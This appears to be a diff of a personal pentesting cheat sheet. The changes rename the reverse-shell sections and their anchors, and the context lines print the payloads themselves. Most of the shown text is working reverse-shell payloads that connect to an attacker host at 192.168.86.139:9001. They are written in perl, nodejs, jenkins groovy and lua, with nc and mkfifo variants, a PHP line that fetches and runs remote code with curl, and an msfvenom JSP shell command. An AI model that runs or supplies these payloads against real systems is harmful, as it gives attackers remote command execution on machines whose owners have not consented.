@@ -51,15 +51,14 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [Covenant Grunt](#convenant-grunt)
 * **[File Transfer](#file-transfer)**
 * **[Reverse Shells](#reverse-shells)**
-	* [php](#php)
-	* [perl](#perl)
-	* [nodejs](#nodejs)
-	* [c](#c)
-	* [c#](#c-sharp)
-	* [jenkins](#jenkins)
-	* [lua](#lua)
-	* [jsp](#jsp)
-	* [asp/aspx](#asp--aspx)
+	* [php](#php-reverse-shell)
+	* [perl](#perl-reverse-shell)
+	* [nodejs](#nodejs-reverse-shell)
+	* [c](#c-reverse-shell)
+	* [c#](#c-sharp-reverse-shell)
+	* [jenkins](#jenkins-reverse-shell)
+	* [lua](#lua-reverse-shell)
+	* [jsp](#jsp-reverse-shell)
 	
 
 ## ACLs possible abuse
@@ -448,13 +447,13 @@ wscript.exe .\realtest.vbs
 
 ## Reverse Shells
 _Credits: These reverse shells examples are reffered to [EzpzShell](https://github.com/H0j3n/EzpzShell) by [@h0j3n](https://twitter.com/h0j3n)_
-### php
+### php-reverse-shell
 You can get a full reverse shell script [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) by PentestMonkey
 ```
 <?php system("curl http://192.168.86.139/shell.php|php"); ?>
 ```
 
-### perl
+### perl-reverse-shell
 ```
 # Example 1
 perl -e 'use Socket;$i="192.168.86.139";$p=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -472,7 +471,7 @@ if(connect(S,sockaddr_in($p,inet_aton($i)))){
 }
 ```
 
-### nodejs
+### nodejs-reverse-shell
 ```
 # Example 1
 require('child_process').exec('nc -e /bin/sh 192.168.86.139 9001')
@@ -492,7 +491,7 @@ require('child_process').exec('nc -e /bin/sh 192.168.86.139 9001')
 })();
 ```
 
-### c
+### c-reverse-shell
 ```
 ######################### Example 1 #############################
 ## Compile : gcc -shared -o libchill.so -fPIC libchill.c
@@ -540,7 +539,7 @@ int main(void){
 }
 ```
 
-### c#
+### c#-reverse-shell
 This c-sharp reverse shell is from [PuckieStyle Blog](https://www.puckiestyle.nl/c-simple-reverse-shell/)._Note: Change `cmd.exe` to `bash` if you are using against linux environment_
 ```
 using System;
@@ -614,14 +613,14 @@ namespace ConnectBack
 }
 ```
 
-### jenkins
+### jenkins-reverse-shell
 ```
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.86.139/9001;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 ```
 
-### lua
+### lua-reverse-shell
 ```
 # Example 1
 os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.86.139 9001 >/tmp/f")
@@ -630,7 +629,7 @@ os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.86.
 lua -e 'os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.86.139 9001 >/tmp/f")'
 ```
 
-### jsp
+### jsp-reverse-shell
 ```
 # Msfvenom => msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.86.139 LPORT=9001 -f raw > shell.jsp
 ```
